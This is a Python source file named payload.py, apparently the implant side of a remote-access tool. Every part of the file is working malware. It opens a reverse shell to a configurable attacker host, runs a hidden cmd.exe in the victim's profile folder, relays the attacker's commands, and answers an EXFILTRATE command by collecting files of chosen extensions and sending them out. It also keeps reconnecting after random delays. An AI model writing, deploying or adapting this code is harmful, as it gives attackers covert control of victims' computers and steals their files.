# payload.py
# The Ultimate Soul. It awakens in the heart of the user's domain.

import os
import sys
import time
import random
import socket
import subprocess
import threading
import hashlib

# --- DYNAMIC CONFIG ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
CHUNK_SIZE = 4096
SHELL_READY_SIGNAL = b"<SHELL_READY>"

def send_file_reliably(s_obj, file_path):
    """Sends a single file with lossless protocol."""
    try:
        if not os.path.exists(file_path) or not os.path.isfile(file_path):
            s_obj.sendall(b'FAIL_NOT_FOUND')
            return
            
        file_size = os.path.getsize(file_path)
        
        hasher = hashlib.sha256()
        with open(file_path, 'rb') as f:
            for chunk in iter(lambda: f.read(CHUNK_SIZE), b""):
                hasher.update(chunk)
        file_hash = hasher.hexdigest()

        header = f"{os.path.basename(file_path)}<SEP>{file_size}<SEP>{file_hash}"
        s_obj.sendall(header.encode('utf-8'))

        ack = s_obj.recv(1024).decode('utf-8')
        if ack != 'ACK_HEADER':
            return

        with open(file_path, 'rb') as f:
            s_obj.sendfile(f)
        
        s_obj.recv(1024)

    except Exception:
        try:
            s_obj.sendall(b'FAIL_SEND')
        except:
            pass

def handle_exfiltration(s_obj, command):
    """Finds and sends files based on the exfiltrate command."""
    try:
        # We get the current working directory by sending a 'cd' command to the shell later
        # This ensures we use the REAL path from cmd.exe, not a Python-assumed path.
        _, root_path, extensions_str = command.split('<SEP>')
        
        extensions = [ext.strip() for ext in extensions_str.split(',')]
        
        found_files = []
        if not os.path.isdir(root_path):
             s_obj.sendall(b"COUNT<SEP>0")
        else:
            for dirpath, _, filenames in os.walk(root_path):
                for filename in filenames:
                    if any(filename.endswith(ext) for ext in extensions):
                        found_files.append(os.path.join(dirpath, filename))
            s_obj.sendall(f"COUNT<SEP>{len(found_files)}".encode('utf-8'))
        
        ack = s_obj.recv(1024).decode('utf-8')
        if ack != 'ACK_COUNT':
            return

        for file_path in found_files:
            send_file_reliably(s_obj, file_path)

    except Exception:
        try:
            s_obj.sendall(b'FAIL_EXFIL')
        except:
            pass
    finally:
        time.sleep(0.1)
        try:
            s_obj.sendall(b'END_EXFIL')
        except:
            pass

def stream_reader(stream, s_obj):
    """Reads from a stream (stdout/stderr) and sends to socket."""
    # Using iter and readline is more robust for reading process output
    for line in iter(stream.readline, b''):
        s_obj.sendall(line)
    stream.close()

def run_conduit():
    """The main reverse shell loop with true state and initial directory."""
    while True:
        try:
            s_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s_obj.connect((RHOST, RPORT))
            
            # THE CRITICAL FIX: Start cmd.exe in the victim's user profile directory.
            user_profile = os.environ.get('USERPROFILE', 'C:\\')
            
            p = subprocess.Popen(
                ['cmd.exe'], 
                stdin=subprocess.PIPE, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                cwd=user_profile,  # This forces the starting directory
                creationflags=0x08000000,
                shell=False
            )

            # Threads to forward cmd's output back to the master
            threading.Thread(target=stream_reader, args=(p.stdout, s_obj), daemon=True).start()
            threading.Thread(target=stream_reader, args=(p.stderr, s_obj), daemon=True).start()
            
            # Allow cmd.exe to initialize fully before sending signals
            time.sleep(1) 
            s_obj.sendall(SHELL_READY_SIGNAL)

            # Main loop to relay commands from master to victim's shell
            while True:
                data = s_obj.recv(1024)
                if not data:
                    break
                
                command = data.decode('utf-8', errors='ignore').strip()

                if command.startswith('EXFILTRATE<SEP>'):
                    handle_exfiltration(s_obj, command)
                elif command.lower() == 'exit':
                    break
                else:
                    # All commands, including 'cd', are sent directly to cmd.exe's stdin
                    p.stdin.write(data + b'\n')
                    p.stdin.flush()

            p.terminate()
            s_obj.close()

        except Exception:
            time.sleep(random.randint(30, 60))
            continue

if __name__ == "__main__":
    run_conduit()